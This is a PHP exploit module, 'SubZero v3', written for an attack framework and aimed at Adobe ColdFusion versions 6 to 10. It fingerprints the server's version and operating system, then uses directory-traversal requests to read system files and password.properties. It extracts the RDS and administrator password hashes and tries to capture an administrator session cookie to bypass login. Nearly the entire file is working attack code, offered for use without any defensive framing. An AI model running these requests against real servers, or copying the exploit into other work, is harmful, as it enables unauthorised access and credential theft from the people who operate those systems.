<?php
/*
ColdFusion v10 Remote Root Zeroday
Version: 1.0
Author: HTP
Adapted to PHP by: Logic
Date:  09 May 2013
*/
namespace exploit;
use \Framework as Framework;
 
class subzero extends Framework {
     
    protected $framework, $name, $description, $variables, $cookie;
   
    public function __construct($framework)
    {
           
        $this->framework = $framework;
        $this->name = 'SubZero v3';
        $this->description = 'CF v6-10 AIO Exploiter';
     	$this->modName = 'subzero';
        $this->variables = array(
	        'path' => array('required' => false, 'description' => 'Enter The Path for CFIDE Login', 'default' => '/CFIDE/adminapi/administrator.cfc'),
	        'login' => array('required' => false, 'description' => 'Enter a Valid Login String', 'default' => '?method=login&adminpassword=&rdsPasswordAllowed=true'),
	        'fpd' => array('required' => false, 'description' => 'Enter a Valid Login String', 'default' => '/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/analyzer/index.cfm&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=ows'),
	        'etchosts' => array('required' => false, 'description' => ' ', 'default' => '/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=../../../../../../../../../../../../../../../etc/hosts&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=ows'),
	        'bootini' => array('required' => false, 'description' => ' ', 'default' => '/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=../../../../../../../../../../../../../../../boot.ini&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp'),
	        'version' => array('required' => false, 'description' => ' ', 'default' => ' '),
	        'os' => array('required' => false, 'description' => ' ', 'default' => ' '),


	    );
           
    }
	public function getName()
	{
		return $this->name;
	}

	public function getDesc()
	{
		return $this->description;
	}

	public function getMod()
	{
		return $this->modName;
	}

	public function getVars()
    {
        return $this->variables;
    }
    
    private function loadModule()
    {
            $this->setModule(1, $this->module_name);
    }

    private function installModule()
    {
            $this->addModule($this->module_name);
            $this->loadModule();
    }
 
    public function check()
    {
		$h = get_headers($this->target.$this->fpd);
        foreach ($h as $t) {
            if(strpos($t,'ANALYZER_DIRECTORY=')!==false){
                $abspath = urldecode(str_replace('Set-Cookie: ANALYZER_DIRECTORY=','',$t));
            }
        }
		$abspath = str_replace('; Path=/', ' ', $abspath);
		echo $this->framework->libs['colours']->cstring("\t[", "white");
		echo $this->framework->libs['colours']->cstring("*", "green");
		echo $this->framework->libs['colours']->cstring("] ", "white"); 
		echo $this->framework->libs['colours']->cstring("Absolute Path is Set as: ", "blue");
        echo $this->framework->libs['colours']->cstring("${abspath}\n", "green");
        if ($abspath[0] == "/") {
		echo $this->framework->libs['colours']->cstring("\t[", "white");
		echo $this->framework->libs['colours']->cstring("*", "green");
		echo $this->framework->libs['colours']->cstring("] ", "white"); 
		echo $this->framework->libs['colours']->cstring("Linux Detected\n", "blue");
    		$os = "Linux";
		} elseif ($abspath[1] == ":") {
			echo $this->framework->libs['colours']->cstring("\t[", "white");
			echo $this->framework->libs['colours']->cstring("*", "green");
			echo $this->framework->libs['colours']->cstring("] ", "white"); 
			echo $this->framework->libs['colours']->cstring("Windows Detected\n", "blue");
    		$os = "Windows";
		}
		else {
			print "Unable to Get OS Version...Sorry :(";
		}

		echo $this->framework->libs['colours']->cstring("\t[", "white");
		echo $this->framework->libs['colours']->cstring("*", "green");
		echo $this->framework->libs['colours']->cstring("] ", "white"); 
		echo $this->framework->libs['colours']->cstring("Detecting Cold Fusion Version\n", "blue");
        $md5request = $this->target."/CFIDE/administrator/images/loginbackground.jpg";
        $results = md5_file($md5request);
		    if ($results == "a4c81b7a6289b2fc9b36848fa0cae83c"){
			echo $this->framework->libs['colours']->cstring("\t[", "white");
			echo $this->framework->libs['colours']->cstring("*", "green");
			echo $this->framework->libs['colours']->cstring("] ", "white"); 
			echo $this->framework->libs['colours']->cstring("Detected ColdFusion 10\n", "blue");
            $this->version = "10";
    	}
		    else if ($results == "596b3fc4f1a0b818979db1cf94a82220"){
			echo $this->framework->libs['colours']->cstring("\t[", "white");
			echo $this->framework->libs['colours']->cstring("*", "green");
			echo $this->framework->libs['colours']->cstring("] ", "white"); 
			echo $this->framework->libs['colours']->cstring("Detected ColdFusion 9\n", "blue");
            $this->version = "9";
    	}
		    else if ($results == "779efc149954677095446c167344dbfc"){
			echo $this->framework->libs['colours']->cstring("\t[", "white");
			echo $this->framework->libs['colours']->cstring("*", "red");
			echo $this->framework->libs['colours']->cstring("] ", "white"); 
			echo $this->framework->libs['colours']->cstring("Cannot Exploit\n", "blue");
  	  	    exit(0);
    	}
   		else {
			echo $this->framework->libs['colours']->cstring("\t[", "white");
			echo $this->framework->libs['colours']->cstring("*", "red");
			echo $this->framework->libs['colours']->cstring("] ", "white"); 
			echo $this->framework->libs['colours']->cstring("Cannot Exploit\n", "blue");;
		    exit(0);
        }
		return 1;
    }


    public function exploit()
    {
		$this->run();                
		return true;
    }


    public function run()
    {		
		$etchosts = $this->target.$this->etchosts;
		$bootini = $this->target.$this->bootini;

		if (strpos($etchosts,'hosts') !== false || strpos($etchosts,'127.0.0.1') !== false) {
			$this->os = "Linux";
		}
		else if (strpos($etchosts,'[boot loader]') !== false || strpos($etchosts,'[operating systems]') !== false) {
			$this->os = "Windows";
		}
		else {
			$this->os = "Unknown";
		}



		echo $this->framework->libs['colours']->cstring("\t[", "white");
		echo $this->framework->libs['colours']->cstring("*", "green");
		echo $this->framework->libs['colours']->cstring("] ", "white"); 
		echo $this->framework->libs['colours']->cstring("Obtaining credentials\n\n", "blue");
		if ($this->os == "Windows" && $this->version == "10") {
			$tests = array("..\..\..\..\..\..\..\..\..\ColdFusion10\lib\password.properties", 
							"..\..\..\..\..\..\..\..\..\ColdFusion10\cfusion\lib\password.properties", 
							"..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties");
		}
		else if ($this->os == "Windows" && $this->version == "9") {
			$tests = array("..\..\..\..\..\..\..\..\..\ColdFusion9\lib\password.properties", 
							"..\..\..\..\..\..\..\..\..\ColdFusion9\cfusion\lib\password.properties", 
							"..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties");

			print "\n\n\t[*] Lets Try one more thing....";
			$h = get_headers($this->target.$this->path.$this->login);
	    	foreach ($h as $t) {
	       		if(strpos($t,'Set-Cookie: CFAUTHORIZATION_cfadmin=') !== false){
	            	if(!(strpos($t,'Set-Cookie: CFAUTHORIZATION_cfadmin=;') !== false)){
	                	$a = str_replace('Set-Cookie: ','',$t);
	                	$a = str_replace(';path=/','',$a);
	                	echo $this->framework->libs['colours']->cstring("\n\n\tAdmin Cookie is: ", "green");
	                	echo $this->framework->libs['colours']->cstring("$a\n\n", "blue");
	                	echo "\tYou may login at: ".$this->target.$this->path."\n\n";
            		}
        		}
    		}
				return 0;
		}
		else if ($this->os == "Windows" && $this->version == "Unknown") {
		    $tests = array("..\..\..\..\..\..\..\..\..\ColdFusion9\lib\password.properties", 
							"..\..\..\..\..\..\..\..\..\ColdFusion10\lib\password.properties", 
							"..\..\..\..\..\..\..\..\..\ColdFusion9\cfusion\lib\password.properties", 
							"..\..\..\..\..\..\..\..\..\ColdFusion10\cfusion\lib\password.properties", 
							"..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties",
							"..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en",
							"..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en",
							"..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en");
		}
	
		else if ($this->os == "Linux") {
			if ($this->version == "10") {
				$tests = array("../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties", 
							"../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties");
			}
			else if ($this->version == "9") {
				$tests = array("../../../../../../../../../opt/coldfusion9/cfusion/lib/password.properties",  
							"../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties");

				print "\n\n\t[*] Lets Try one more thing....";
				$h = get_headers($this->target.$this->path.$this->login);
		    	foreach ($h as $t) {
		       		if(strpos($t,'Set-Cookie: CFAUTHORIZATION_cfadmin=') !== false){
		            	if(!(strpos($t,'Set-Cookie: CFAUTHORIZATION_cfadmin=;') !== false)){
		                	$a = str_replace('Set-Cookie: ','',$t);
		                	$a = str_replace(';path=/','',$a);
		                	echo $this->framework->libs['colours']->cstring("\n\n\tAdmin Cookie is: ", "green");
		                	echo $this->framework->libs['colours']->cstring("$a\n\n", "blue");
		                	echo "\tYou may login at: ".$this->target.$this->path."\n\n";
	            		}
	        		}
	    		}
				return 0;
			}
			else if ($this->version == "7") {
				$tests = array("../../../../../../../../opt/coldfusionmx7/lib/password.properties%00en");
			}
		}
		else if ($this->version == "Unknown") {
			$tests = array("../../../../../../../../../opt/coldfusion9/cfusion/lib/password.properties", 
							"../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties", 
							"../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties");
			}
		else if ($this->os == "Unknown") {
			$tests = array("..\..\..\..\..\..\..\..\..\ColdFusion9\lib\password.properties",  
						"..\..\..\..\..\..\..\..\..\ColdFusion10\lib\password.properties", 
						"..\..\..\..\..\..\..\..\..\ColdFusion9\cfusion\lib\password.properties", 
						"..\..\..\..\..\..\..\..\..\ColdFusion10\cfusion\lib\password.properties", 
						"..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties", 
						 "../../../../../../../../../opt/coldfusion9/cfusion/lib/password.properties", 
						"../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties", 
						"../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties",
						"../../../../../../../../opt/coldfusionmx7/lib/password.properties%00en");
		}
		
		foreach ($tests as $test) {
		$decode = $this->framework->libs['webot']->curl_get_contents("$this->target/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=".$test."&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=ows");


		if (strpos($decode,'encrypted=') !== false) {

			echo $this->framework->libs['colours']->cstring("\n\t[", "white");
			echo $this->framework->libs['colours']->cstring("*", "green");
			echo $this->framework->libs['colours']->cstring("] ", "white"); 
			echo $this->framework->libs['colours']->cstring("RDS Password Hash:    ", "blue");   
			$rds = $this->framework->libs['webot']->return_between($decode, "rdspassword=/","\=
password=", 1);
			echo $this->framework->libs['colours']->cstring($rds, "green");
			echo $this->framework->libs['colours']->cstring("\n\t[", "white");
			echo $this->framework->libs['colours']->cstring("*", "green");
			echo $this->framework->libs['colours']->cstring("] ", "white"); 
			echo $this->framework->libs['colours']->cstring("Admin Password Hash:  ", "blue");  
			$admin = $this->framework->libs['webot']->return_between($decode, "=
password=","encrypted=", 1);
			echo $this->framework->libs['colours']->cstring($admin, "green");

			}
	  	}
	}
	public function post()
    {
        print "This module does not support post Exploit\n";
		return 0;
    }
}
?>



